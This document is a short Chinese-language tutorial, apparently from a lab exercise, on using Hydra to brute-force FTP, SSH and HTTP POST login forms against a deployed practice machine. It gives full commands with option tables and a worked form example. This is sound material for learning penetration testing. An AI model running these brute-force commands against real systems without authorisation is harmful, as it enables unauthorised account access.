# hydrea

## 🛠️ Hydra 命令

我们传递给 **Hydra** 的选项取决于我们正在攻击的服务（协议）。例如，如果我们要使用用户名 **user** 和密码列表 **passlist.txt** 来暴力破解 **FTP**，我们将使用以下命令：

```bash
hydra -l user -P passlist.txt ftp://10.48.162.150
```

对于这台已部署的机器，以下是在 **SSH** 和 **Web 表单 (POST 方法)** 上使用 **Hydra** 的命令。


-----

## 🔒 SSH 暴力破解

```bash
hydra -l <username> -P <full path to pass> 10.48.162.150 -t 4 ssh
```

| 选项 | 描述 |
|:---|:---|
| `-l` | 指定登录用的 **(SSH) 用户名** |
| `-P` | 指示一个 **密码列表** |
| `-t` | 设置要生成的 **线程数** |

例如，`hydra -l root -P passwords.txt 10.48.162.150 -t 4 ssh` 将使用以下参数运行：

* **Hydra** 将使用 **root** 作为 ssh 的用户名。
* 它将尝试 **passwords.txt** 文件中的密码。
* 将有四个线程并行运行，如 **-t 4** 所示。


-----

## 🌐 Web 表单 (POST) 暴力破解

我们也可以使用 **Hydra** 来暴力破解 **Web 表单**。你必须知道它正在进行哪种类型的请求；**GET** 或 **POST** 方法是常用的。你可以使用浏览器的网络选项卡（在开发者工具中）来查看请求类型或查看源代码。

```bash
sudo hydra <username> <wordlist> 10.48.162.150 http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| 选项 | 描述 |
|:---|:---|
| `-l` | **(Web 表单) 登录** 的用户名 |
| `-P` | 要使用的 **密码列表** |
| `http-post-form` | 表单的类型是 **POST** |
| `<path>` | 登录页面的 **URL**，例如 `login.php` |
| `<login_credentials>` | 用于登录的 **用户名和密码**，例如 `username=^USER^&password=^PASS^` |
| `<invalid_response>` | 登录失败时响应中的 **部分字符串** |
| `-V` | 每次尝试的 **详细输出** |

下面是一个更具体的 **Hydra** 命令示例，用于暴力破解 POST 登录表单：

```bash
hydra -l <username> -P <wordlist> 10.48.162.150 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

* 登录页面仅是 **/**，即主要的 IP 地址。
* `username` 是输入用户名的**表单字段**。
  * 指定的用户名将替换 **^USER^**。
* `password` 是输入密码的**表单字段**。
  * 提供的密码将替换 **^PASS^**。
* 最后，`F=incorrect` 是登录失败时服务器回复中出现的一个**字符串**。

你现在应该有足够的信息来将此付诸实践，并暴力破解你部署机器的凭证了！